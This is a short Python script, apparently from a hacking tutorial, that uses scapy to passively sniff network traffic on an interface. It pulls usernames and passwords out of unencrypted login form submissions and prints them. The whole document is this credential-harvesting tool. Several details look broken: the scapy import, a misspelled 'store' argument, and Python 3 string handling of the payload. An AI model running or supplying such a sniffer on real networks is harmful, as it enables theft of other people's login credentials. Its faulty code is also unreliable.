from scapy import *
from urllib import parse
import re

iface = 'eth0'

def get_password(body):

    user = None
    password = None

    user_fields = ['log', 'login', 'wpname', 'user', 'email', 'login email', 'username']

    password_fields = ['password', 'login password', 'passwd', 'login_passwd']
    
    for login in user_fields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()

    for password_field in password_fields:
        password_re = re.search('(%s=[^&]+)' % password_field, body, re.IGNORECASE)
        if password_re:
            password = password_re.group()
    
    if user and password:
        return(user, password)

def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_and_pass = get_password(body)
        
        if user_and_pass != None:
            print(packet[TCP].payload)
            print('[+]' + parse.unquote(user_and_pass[0]))
            print('[+]' + parse.unquote(user_and_pass[1]))
    else:
        pass

try:
    sniff(iface=iface, prn=pkt_parser, dtore=0)
except KeyboardInterrupt:
    print('[+] Exiting !!!')
    exit(0)